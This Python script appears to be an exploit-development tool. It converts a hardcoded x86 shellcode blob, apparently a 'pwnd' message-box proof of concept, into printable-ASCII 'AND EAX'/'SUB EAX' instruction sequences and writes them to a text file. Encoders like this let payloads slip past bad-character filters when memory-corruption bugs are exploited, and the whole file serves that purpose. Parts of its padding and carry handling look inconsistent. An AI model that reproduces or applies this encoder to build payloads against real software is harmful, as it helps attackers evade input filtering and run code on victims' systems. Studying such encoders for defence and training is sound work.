from ast import literal_eval
from itertools import combinations 
import random


def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

ascii = "0102030405060708090b0c0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e303132333435363738393b3c3d3e4142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f"

combinations = list(combinations(range(1,127),3))
random.shuffle(combinations)

CF1 = 0
CF2 = 0 
CF3 = 0 
CF4 = 0 
sub1 = ""
sub2 = ""
sub3 = ""

def buildInstruction(one, two, three): #sto a spari 
    global sub1
    sub1 = sub1 + (('0'+one.replace('0x','')) if  len(one.replace('0x','')) ==1 else one.replace('0x',''))
    global sub2
    sub2 = sub2 + (('0'+two.replace('0x','')) if  len(two.replace('0x','')) ==1 else two.replace('0x',''))
    global sub3
    sub3 = sub3 + (('0'+three.replace('0x','')) if  len(three.replace('0x','')) ==1 else three.replace('0x',''))

def findHex(val,flag): 
    for i in combinations:
      if flag == 0: 
         if (i[0]+i[1]+i[2]) == val:
            print ("Printing results, lovely ... ")
            print (i[0], i[1], i[2])
            print (str(tohex(i[0],32)) + " " + str(tohex(i[1],32)) + " " +  str(tohex(i[2],32)) )
            buildInstruction(str(tohex(i[0],32)),str(tohex(i[1],32)), str(tohex(i[2],32)))
            return 
      else: 
         if (i[0]+i[1]+i[2]+1) == val:
            print ("Printing results, lovely ... ")
            print ("Flag: " + str(flag))
            print (i[0], i[1], i[2], 1)
            print (str(tohex(i[0],32)) + " " + str(tohex(i[1],32)) + " " +  str(tohex(i[2],32)) )
            buildInstruction(str(tohex(i[0],32)),str(tohex(i[1],32)),str(tohex(i[2],32)))
            return 


def parseInstruction(instr):
#    print ( "Working on: ")
#    print ( ('0x'+instr[0:2]))
#    print ( ('0x'+instr[2:4]))
#    print ( ('0x'+instr[4:6]))
#    print ( ('0x'+instr[6:8]))
#    print ( "Decimal format: ")
    byteDecF = checkNull(instr,0,2)
    byteDecS = checkNull(instr,2,4)
    byteDecT = checkNull(instr,4,6)
    byteDecFo = checkNull(instr,6,8)
#    print (byteDecF)
#    print  (byteDecS)
#    print (byteDecT)
#    print (byteDecFo)
    findHex(byteDecF,0) 
    findHex(byteDecS,CF1)
    findHex(byteDecT,CF2)
    findHex(byteDecFo,CF3)


def checkNull(input,base,offset):
   if input[base:offset] == "00":
        if base == 0:
           global CF1
           CF1=1
        if base == 2:
           global CF2
           CF2=1
        if base == 4:
           global CF3
           CF3=1
        if base == 6:
           global CF4 
           CF4=1
        return int(('0x1'+input[base:offset]),16)
   else: 
        return int(('0x'+input[base:offset]),16) 


def reverseHex(hex):
    hexbyte1 = hex[0] + hex[1]
    hexbyte2 = hex[2] + hex[3]
    hexbyte3 = hex[4] + hex[5]
    hexbyte4 = hex[6] + hex[7] 
    newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
    return newhex

def splitShellcode(shellc):
    return  [(shellc[i:i+8]) for i in range(0, len(shellc), 8)]


def paddMe(shellcode):
    shellcode = shellcode + ('90'*(8-len(splitShellcode(shellcode)[-1]))) 
    print (('90'*(8-len(splitShellcode(shellcode)[-1]))) )
    return shellcode


#def instructionBeautifier(data): 
    
#YESSES
#Dreaming a better handling of longer shellcode ... 

toencode = ("33C05068"
"70776e64"
"8BCC5068"
"70776e74"
"8BD45051"
"5250BEDE"
"d83b77ff"
"d6909090")

#fino a qui sembra scriverlo correttamente 

print ("YESSES, I LL DO IT ASCII ONLY!")

if len(toencode)%4 != 0:
   print ("We gotta add some padding my friend! ")
   toencode = paddMe(toencode)

if len(toencode) > 8: 
   print ("Long shellcode wowowowowowo! ")
   toencode = splitShellcode(toencode)
   for i in toencode: 
      print ("Subencoding instructions: " + i)
      i = reverseHex(i)
      print ("Little endianess reverse")
      print (i)
      print ("Difference is: ")
      res = tohex( literal_eval(str('0x00000000')) - literal_eval(str('0x'+i)) ,32)
      res = res[2:10]
      if (len(res) < 8):
          res = ('0'*(8-len(res)))+res
      print (res)
      CF1 = 0
      CF2 = 0
      CF3 = 0
      CF4 = 0
      parseInstruction(res)

      print ("Here you have your lovely instructions :)")
 
      print ("SUB EAX," + str(sub1))
      print ("SUB EAX," + str(sub2))
      print ("SUB EAX," + str(sub3))
      f = open("lovely-shellcode.txt", "a")
      f.write("AND EAX,554E4D4A\n")
      f.write("AND EAX,2A313235\n")
      f.write("SUB EAX," + str(sub1) + "\n")
      f.write("SUB EAX," + str(sub2) + "\n")
      f.write("SUB EAX," + str(sub3) + "\n")
      f.close()
#      global sub1
#      global sub2
#      global sub3
      sub1 = ""
      sub2 = ""
      sub3 = ""
else: 
   print ("One instruction a time is so boring ..." )
   print ("Subencoding instructions: " + toencode)
   toencode = reverseHex(toencode)
   print ("Little endianess reverse")
   print (toencode)
   print ("Difference is: ")
   res = tohex( literal_eval(str('0x00000000')) - literal_eval(str('0x'+toencode)) ,32)
   res = res[2:10]
   print (res)
   if (len(res) < 8):
       res = '0'+res

   CF1 = 0
   CF2 = 0
   CF3 = 0
   CF4 = 0
   parseInstruction(res)
   
   print ("Here you have your lovely instructions :)")

   print ("SUB EAX," + str(sub1))
   print ("SUB EAX," + str(sub2))
   print ("SUB EAX," + str(sub3))
   








